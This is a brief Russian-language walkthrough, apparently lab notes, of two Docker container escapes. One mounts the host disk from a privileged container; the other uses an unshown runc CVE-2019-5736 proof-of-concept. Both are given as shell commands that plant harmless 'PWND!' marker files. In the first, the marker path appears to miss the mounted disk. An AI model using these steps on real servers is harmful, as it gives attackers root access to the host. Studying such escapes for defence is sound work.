## Повышаем привилегии на сервере с использованием docker

### Используем привилегированный режим
```
docker run -it --rm --privileged nginx:1.21.3 bash

mkdir /mount
mount /dev/sda1 /mount
```
Убедимся, что мы действительно примонтировали корень файловой системы
```
ls /mount
```
Создадим нужный фаил
```
echo "PWND!" > /priv
```
### Используем уязвимость CVE-2019-5736 старой версии runc

В файле main.go на 17 строке меняем echo 'replace-me' на 
```
echo 'PWND!' > /CVE
```
Собираем контейнер
```
docker build -t cve-2019-5736-go .
```
Запускаем контейнер
```
docker run -d --name poc_go cve-2019-5736-go
```
Триггерим уязвимость
```
docker exec poc_go /bin/sh
```


